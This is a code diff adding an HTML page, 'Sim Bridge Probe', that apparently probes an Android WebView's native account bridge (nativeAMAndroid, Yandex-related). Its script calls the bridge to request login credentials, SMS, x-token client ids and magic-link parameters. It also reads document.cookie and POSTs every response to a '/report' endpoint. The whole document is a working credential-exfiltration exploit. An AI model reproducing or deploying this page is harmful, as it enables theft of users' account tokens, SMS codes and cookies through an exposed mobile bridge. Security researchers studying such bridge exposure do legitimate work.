@@ -1,0 +1,70 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Sim Bridge Probe</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body style="font-family:monospace;background:#111;color:#0f0;padding:10px;font-size:11px;word-break:break-all;">
+<pre id="out">BRIDGE PROBE
+</pre>
+<script>
+(function () {
+    var out = document.getElementById('out');
+
+    function log(s) {
+        out.textContent += '\n' + s;
+        fetch('/report', {method: 'POST', body: String(s).slice(0, 4000)});
+    }
+
+    log('URL: ' + location.href);
+    log('UA: ' + navigator.userAgent);
+
+    var keys = Object.getOwnPropertyNames(window).filter(function (k) {
+        return /native|AM|passport|sim|Sim|yandex|Yandex|flutter|Flutter/i.test(k);
+    });
+    log('WINDOW KEYS: ' + keys.join(', '));
+
+    var na = window.nativeAMAndroid;
+
+    if (!na) {
+        log('!! nativeAMAndroid NOT FOUND');
+    } else {
+        var methods = [];
+        for (var m in na) methods.push(m + ':' + typeof na[m]);
+        log('nativeAMAndroid methods: ' + methods.join(', '));
+
+        window.nativeAMResponse = {
+            receive: function (reqId, json) {
+                log('<<< RESPONSE ' + reqId + ' :: ' + JSON.stringify(json));
+            }
+        };
+
+        var seq = [
+            {message: 'ready', data: {}},
+            {message: 'requestLoginCredentials', data: {}},
+            {message: 'getSms', data: {}},
+            {message: 'getXTokenClientId', data: {}},
+            {message: 'requestMagicLinkParams', data: {}},
+            {message: 'chooseAccount', data: {}}
+        ];
+
+        seq.forEach(function (msg, i) {
+            setTimeout(function () {
+                var id = 'probe' + i + '_' + Date.now();
+                var payload = {version: '1.0', message: msg.message, requestId: id, data: msg.data};
+                try {
+                    na.send(JSON.stringify(payload));
+                    log('>>> sent ' + msg.message + ' (' + id + ')');
+                } catch (e) {
+                    log('send error ' + msg.message + ': ' + e);
+                }
+            }, 500 + i * 900);
+        });
+    }
+
+    log('COOKIE: ' + (document.cookie || '(empty)'));
+})();
+</script>
+</body>
+</html>
